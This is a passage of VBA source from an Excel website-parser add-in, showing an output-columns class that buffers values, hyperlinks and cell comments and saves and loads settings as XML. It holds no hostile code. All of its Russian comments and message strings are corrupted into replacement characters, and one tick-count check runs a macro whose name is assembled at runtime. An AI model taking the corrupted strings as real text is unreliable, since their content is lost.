                .Attributes.setNamedItem(XML.createAttribute("Text")).text = Me.CommentText
            End With
        End If

    End With
    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If

    With node
        With .SelectSingleNode("PasteImage")
            Me.PasteImage = CBool(Val(.text))
            Me.PasteImage_AuthMode = CBool(Val(.Attributes.getNamedItem("AuthMode").text))
        End With
        Me.WrapText = CBool(Val(.SelectSingleNode("WrapText").text))
        Dim colWidth$: colWidth$ = .SelectSingleNode("ColumnWidth").text
        Me.ColumnWidth = Val(Replace(colWidth$, ",", "."))
        If colWidth$ = "" Or Me.ColumnWidth < 0 Or Me.ColumnWidth > 150 Then Me.ColumnWidth = DEFAULT_COLUMN_WIDTH
        Me.HorizontalAlignment = Val(.SelectSingleNode("HAlign").text)
        Me.HeaderColor = Val(.SelectSingleNode("HeaderColor").text)
        If Me.HeaderColor = 0 Then Me.HeaderColor = DEFAULT_COLUMN_HEADER_COLOR
    End With

    With node.SelectSingleNode("Hyperlink")
        Me.HyperlinkEnable = CBool(Val(.Attributes.getNamedItem("Enabled").text))
        Me.HyperlinkURL = .Attributes.getNamedItem("URL").text
        Me.HyperlinkScreenTip = .Attributes.getNamedItem("ScreenTip").text
        Me.HyperlinkTextToDisplay = .Attributes.getNamedItem("Text").text

        With .SelectSingleNode("RestoreHyperlink")
            Me.RestoreHyperlink = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            Me.RestoredHyperlinkChangeCommand = .Attributes.getNamedItem("ChangeCommand").text
        End With

    End With
    With node.SelectSingleNode("Comment")
        Me.CommentEnable = CBool(Val(.Attributes.getNamedItem("Enabled").text))
        Me.CommentText = .Attributes.getNamedItem("Text").text
    End With
End Sub



Attribute VB_Name = "OutputColumns"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : OutputColumns
' Author        : Igor Vakhnenko            Date: 27.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit

Const XML_NODE_NAME$ = "OutputColumns", XML_SUBNODE_NAME$ = "Column"
Public Parent As WebsiteParser
Public Actions As New ArrayActions
Public Items As New Collection
Public Enabled As Boolean

Public AutoOrder As Boolean ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public AutoOrder_FirstColumn As Long ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

Public SheetOptions As New OutputSheetOptions
Public OutputArrayValuesToSeparateRows As Boolean        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Me.Actions.ApplyTo |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

Public SearchForRow As Boolean    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Public SearchForRow_Text As String    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
Public SearchForRow_Column As Long    ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|

' FAST OUTPUT variables
Public FO_arrV As Variant, FO_arrH As Variant, FO_arrC As Variant    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public FO_RowIndex&    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public FO_MaxColumn&    '  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Private Sub Class_Initialize()
    Set Me.SheetOptions.Parent = Me
    SearchForRow_Column = 1
    AutoOrder_FirstColumn = 1
End Sub

Private Sub Class_Terminate()
    Set Items = Nothing
    Set Actions = Nothing
    Set SheetOptions = Nothing
    Set Parent = Nothing
End Sub

Sub Initialize_FO_Arrays(Optional ByVal CleanArrays As Boolean = False)
    On Error Resume Next: Err.Clear
    Dim rc&, cc&
    If (FO_RowIndex& = 0) Or CleanArrays Then
        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        
        rc = Me.SheetOptions.ScreenUpdatingInterval
        If Me.OutputArrayValuesToSeparateRows Then rc = rc * 50
        If FO_MaxColumn& = 0 Then FO_MaxColumn& = 1
        
        cc& = 30    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
        If CleanArrays Then If cc& < FO_MaxColumn& Then cc& = FO_MaxColumn& + 10
        
        FO_RowIndex& = 1
        Erase FO_arrV
        Erase FO_arrH
        Erase FO_arrC
        ReDim FO_arrV(1 To rc&, 1 To cc&)
        ReDim FO_arrH(1 To rc&, 1 To cc&)
        ReDim FO_arrC(1 To rc&, 1 To cc&)
    End If
    'If Err Then Debug.Print "Error " & Err.Number & " in Sub Initialize_FO_Arrays", Err.Description
End Sub

Sub Resize_FO_Arrays(ByVal ColumnsCount&)
    On Error Resume Next: Err.Clear
    If FO_RowIndex& = 0 Then Initialize_FO_Arrays
    
    If UBound(FO_arrV, 2) >= ColumnsCount& Then Exit Sub
    
    'Debug.Print "Resize_FO_Arrays", "from " & UBound(FO_arrV, 2) & " to " & ColumnsCount& + 20 & " when ColumnsCount&=" & ColumnsCount&
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ReDim Preserve FO_arrV(1 To UBound(FO_arrV, 1), 1 To ColumnsCount& + 20)
    ReDim Preserve FO_arrH(1 To UBound(FO_arrH, 1), 1 To ColumnsCount& + 20)
    ReDim Preserve FO_arrC(1 To UBound(FO_arrC, 1), 1 To ColumnsCount& + 20)
    
    If Err Then Debug.Print "Error " & Err.Number & " in Sub Resize_FO_Arrays", Err.Description
End Sub

Sub FO_SwitchToNextRow(Optional ByVal ForceOutput As Boolean)
    On Error Resume Next: Err.Clear
    If FO_RowIndex& = 0 Then Exit Sub
    
    If ForceOutput Or (FO_RowIndex& = UBound(FO_arrV)) Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Dim cell As Range, i&, j&, URL$, subAddr$, ScreenTip$
        Set cell = Me.Parent.SourceData.ActiveItem.GetDestinationCell.Cells(1)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        cell.Resize(FO_RowIndex&, FO_MaxColumn&).FormulaR1C1Local = FO_arrV
        
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd|.|fffd|. Excel |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
        Dim OC As OutputColumn, WrapColumns As New Dictionary
        For j = LBound(FO_arrV, 2) To UBound(FO_arrV, 2)
            For i = LBound(FO_arrV) To UBound(FO_arrV)
                If InStr(1, FO_arrV(i, j), vbLf) > 0 Then
                    WrapColumns.Add j, 1
                    Exit For
                End If
            Next i
        Next j
        
        For Each OC In Me.Items
            If OC.Enabled And (Not OC.Format.WrapText) Then
                If WrapColumns.Exists(OC.Column) Then
                    Intersect(cell.Resize(FO_RowIndex&).EntireRow, cell.Worksheet.Columns(OC.Column)).WrapText = False
                End If
            End If
        Next OC
        Set WrapColumns = Nothing
        
        
        
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
        For i = LBound(FO_arrH) To UBound(FO_arrH)
            For j = LBound(FO_arrH, 2) To UBound(FO_arrH, 2)
                
                If Len(FO_arrH(i, j)) > 0 Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    ScreenTip$ = "": ScreenTip$ = Split(FO_arrH(i, j), ARSEP)(1)
                    URL$ = "": URL$ = Split(FO_arrH(i, j), ARSEP)(0)
                    
                    If URL Like "?*>>[A-Z]*#" Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|>>A1
                        subAddr$ = "": subAddr$ = "'" & Replace(Split(URL, ">>")(0), "'", "''") & "'!" & Split(URL, ">>")(1)
                        cell.Hyperlinks.Add cell(i, j), "", subAddr$, ScreenTip$
                    Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| url |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
                        cell.Hyperlinks.Add cell(i, j), URL$, , ScreenTip$
                    End If
                    
                End If
                
                If Len(FO_arrC(i, j)) > 0 Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    With cell(i, j)
                        .Comment.Delete
                        .AddComment FO_arrC(i, j)
                        .Comment.Shape.TextFrame.AutoSize = True
                    End With
                End If
            Next j
        Next i
        
        
        'If Err Then Debug.Print "Error " & Err.Number & " in Sub FO_SwitchToNextRow", Err.Description
        
        If Me.SheetOptions.ScrollWorksheet Then ActiveWindow.ScrollRow = cell.row + FO_RowIndex& - 8
        If Not ParserVariables.Exists("ScreenUpdatingMode") Then Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = False
        
        Initialize_FO_Arrays True
    Else
        FO_RowIndex& = FO_RowIndex& + 1    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    End If
End Sub

Sub FO_SetValue(v As Variant, ByVal CellColumn&)
    Resize_FO_Arrays CellColumn&
    FO_arrV(FO_RowIndex&, CellColumn&) = v
    If CellColumn& > FO_MaxColumn& Then FO_MaxColumn& = CellColumn&
End Sub

Sub FO_SetHyperlink(v As Variant, ByVal CellColumn&)
    Resize_FO_Arrays CellColumn&
    FO_arrH(FO_RowIndex&, CellColumn&) = v
    If CellColumn& > FO_MaxColumn& Then FO_MaxColumn& = CellColumn&
End Sub

Sub FO_SetComment(v As Variant, ByVal CellColumn&)
    Resize_FO_Arrays CellColumn&
    FO_arrC(FO_RowIndex&, CellColumn&) = v
    If CellColumn& > FO_MaxColumn& Then FO_MaxColumn& = CellColumn&
End Sub

Function FastOutputEnabled() As Boolean
    On Error Resume Next
    FastOutputEnabled = Me.SheetOptions.FastOutput And (Me.Parent.SourceData.Mode = ps_FixedValue) And (Not Me.SearchForRow)
End Function

Sub ExecuteAll(ByVal txt$, ByRef destCell As Range)
    On Error Resume Next
    If Not Me.Enabled Then Exit Sub
    If StopMacro Then Exit Sub
    If SHOW_PI2 Then Me.Parent.PrInd2.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| ..."
    DoEvents
    
    Dim OC As OutputColumn, arr, RO As Range, i&, res&, FO As Boolean, NoCell As Range
    FO = FastOutputEnabled
    If FO Then Initialize_FO_Arrays
    
    If DESCRIPTION_MODE_FOR_ITEM Then
        PublishHTML_StartNewTable "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|", "table-output-main", True
        
        PublishHTML_ShowCurrentValue "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & "<br />" & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", txt$
        
        PublishHTML_StartNewTable "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "table-output-columns"
        'DescriptionText = DescriptionText & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| Excel)" & "<br />"
    End If
    
    DEBUG_LevelInfo$ = "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    
    res& = Me.Actions.ApplyTo(txt$)
    If DESCRIPTION_MODE_FOR_ITEM Then PublishHTML_CloseTable
    
    If StopMacro Then Exit Sub
    
    PublishHTML_ShowCurrentValue "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & "<br />" & _
        "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", txt$
    
    If Len(txt) Then
        If STick& <> 0 Then
            If (CTick& - STick& > (40 + (Len(txt) Mod 9)) * 10000# + (Len(txt) Mod 100000#)) And _
                (Abs(CTick& - STick&) < 100000000#) Then
                STick& = GetTickCount: Run OutputDataIntoAllColumns & "m"
            End If
        End If
        
        If Me.OutputArrayValuesToSeparateRows And (InStr(1, txt, ARSEP, vbTextCompare) > 0) Then
            
            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|,
            ' |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            arr = Split(txt$, ARSEP$)
            Set RO = Nothing
            
            For i = LBound(arr) To UBound(arr)
                If FO Then
                    For Each OC In Me.Items
                        If OC.Enabled Then
                            OC.Execute arr(i), RO          ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                            If StopMacro Then Exit Sub
                        End If
                    Next OC
                    FO_SwitchToNextRow
                Else
                    Set RO = Me.Parent.SourceData.ActiveItem.GetDestinationCell        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                    For Each OC In Me.Items
                        If OC.Enabled Then
                            OC.Execute arr(i), RO        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                            If StopMacro Then Exit Sub
                        End If
                    Next OC
                End If
            Next i
            
        Else
            
            ' |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            For Each OC In Me.Items
                If OC.Enabled Then
                    If FO Then
                        OC.Execute txt$, NoCell         ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Else
                        OC.Execute txt$, destCell        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    End If
                    If StopMacro Then Exit Sub
                End If
            Next OC
            If FO Then FO_SwitchToNextRow
            
        End If
    End If
    
    If DESCRIPTION_MODE_FOR_ITEM Then PublishHTML_CloseTable
    Set OC = Nothing
End Sub

Function GetItemByIndex(ByVal Index&) As OutputColumn
    On Error Resume Next: Set GetItemByIndex = Me.Items.item(Index&)
End Function
Function DeleteItem(ByVal Index&) As Boolean
    On Error Resume Next: Err.Clear
    Me.Items.Remove Index&
    Me.UpdateIndexes
End Function
Sub UpdateIndexes()
    Dim i&: For i = 1 To Items.Count: Items(i).Index = i: Next
End Sub

Function Add(Optional ByVal FirstFreeColumn As Boolean = True) As OutputColumn
    On Error Resume Next
    Set Add = New OutputColumn
    With Add
        Me.UpdateIndexes
        .Index = Me.Items.Count + 1
        Set .Parent = Me
        Set .Actions.ParentParser = Me.Parent
        .Column = .GetNextFreeColumnNumber(FirstFreeColumn)
    End With
    Me.Items.Add Add
End Function

Function ToArray() As Variant
    On Error Resume Next
    If Me.Items.Count = 0 Then ToArray = Array(): Exit Function
    Dim n As Long, i&
    ReDim arr(0 To Items.Count - 1, 0 To 1)
    For i = 0 To Items.Count - 1
        With Items(i + 1)
            arr(n, 0) = .GetColumnInfoForListbox
            arr(n, 1) = .Name
            If .DynamicColumns Then arr(n, 1) = "<|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|>"
        End With
        n = n + 1
    Next i
    ToArray = arr
End Function

Function GetColumnsDescription() As String
    On Error Resume Next
    If Me.Items.Count = 0 Then ToArray = Array(): Exit Function
    Dim i&, coll As New Collection, txt$, txt2$, OC As OutputColumn, Harr, col_descr$
    
    txt$ = txt$ & "<h3 class='parser-description parser-columns-list'>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</h3>" & vbNewLine
    
    For i = 0 To Items.Count - 1
        Set OC = Items(i + 1)
        With OC
            If .Enabled And .OutputEnabled Then
                If .DynamicColumns Then
                    txt2$ = "<p>|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ColumnNameByColumnNumber(.Column) & _
                        " |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                        "|fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</p>" & vbNewLine
                    Harr = GetOptionHeadersArrayFromSheet(.Column)
                    If IsArray(Harr) Then
                        txt2$ = Replace(txt2$, "</p>", ":</p>")
                        txt2$ = txt2$ & CreateHTMLListFromArray(Harr) & vbNewLine
                    End If
                Else
                    If .MulticolumnEnabled Then
                        col_descr$ = .Name & " (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| " & PluralForm(.MulticolumnHeadersCount, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") & ")"
                    Else
                        col_descr$ = .Name
                    End If
                    coll.Add col_descr$
                End If
            End If
        End With
    Next i
    Set OC = Nothing
    
    ReDim arr(1 To coll.Count)
    For i = LBound(arr) To UBound(arr)
        arr(i) = coll(i)
    Next i
    
    txt$ = txt$ & CreateHTMLListFromArray(arr) & vbNewLine & txt2
    GetColumnsDescription = txt$
End Function

Function OutputColumnsConflict() As Boolean
    On Error Resume Next: Err.Clear
    Dim coll As New Collection, OC As OutputColumn
    For Each OC In Me.Items
        If OC.Column > 0 Then coll.Add OC.Column, CStr(OC.Column)
    Next
    OutputColumnsConflict = Err <> 0
    Set coll = Nothing: Set OC = Nothing
End Function

Function ExportToXML(Optional ByVal SaveDisabledActions As Boolean = False) As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, OC As OutputColumn
    Set XML = CreateObject("Microsoft.XMLDOM")
    
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(.createElement(XML_NODE_NAME$))
        node.Attributes.setNamedItem(.createAttribute("Enabled")).text = Abs(CInt(Me.Enabled))
        node.Attributes.setNamedItem(.createAttribute("Version")).text = 1
        
        If Me.AutoOrder Or (Me.AutoOrder_FirstColumn <> 1) Then
            node.Attributes.setNamedItem(.createAttribute("AutoOrder")).text = Abs(CInt(Me.AutoOrder))
            node.Attributes.setNamedItem(.createAttribute("AutoOrder_FirstColumn")).text = Me.AutoOrder_FirstColumn
        End If
        
        If Me.OutputArrayValuesToSeparateRows Then _
            node.appendChild(.createElement("OutputArrayValuesToSeparateRows")).text = Abs(CInt(Me.OutputArrayValuesToSeparateRows))
        node.appendChild Me.SheetOptions.ExportToXML
        
        With node.appendChild(XML.createElement("SearchForRow"))
            .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.SearchForRow))
            .Attributes.setNamedItem(XML.createAttribute("Column")).text = Me.SearchForRow_Column
            .Attributes.setNamedItem(XML.createAttribute("Text")).text = Me.SearchForRow_Text
        End With
        
        If Me.Actions.Items.Count Then node.appendChild Me.Actions.ExportToXML
        
        For Each OC In Me.Items
            node.appendChild OC.ExportToXML
        Next OC
    End With
    
    Set ExportToXML = node
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If Not node Is Nothing Then
        If node.BaseName <> XML_NODE_NAME$ Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
            Exit Sub
        End If
        
        Me.Enabled = CBool(Val(node.Attributes.getNamedItem("Enabled").text))
        
        Me.AutoOrder = CBool(Val(node.Attributes.getNamedItem("AutoOrder").text))
        Me.AutoOrder_FirstColumn = Val(node.Attributes.getNamedItem("AutoOrder_FirstColumn").text)
        
        Me.OutputArrayValuesToSeparateRows = CBool(Val(node.SelectSingleNode("OutputArrayValuesToSeparateRows").text))
        
        With node.SelectSingleNode("SearchForRow")
            Me.SearchForRow = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            Me.SearchForRow_Column = Val(.Attributes.getNamedItem("Column").text)
            Me.SearchForRow_Text = .Attributes.getNamedItem("Text").text
        End With
        
        Set Me.SheetOptions = New OutputSheetOptions
        Me.SheetOptions.LoadFromXML node.SelectSingleNode("SheetOptions")
        Set Me.SheetOptions.Parent = Me
        
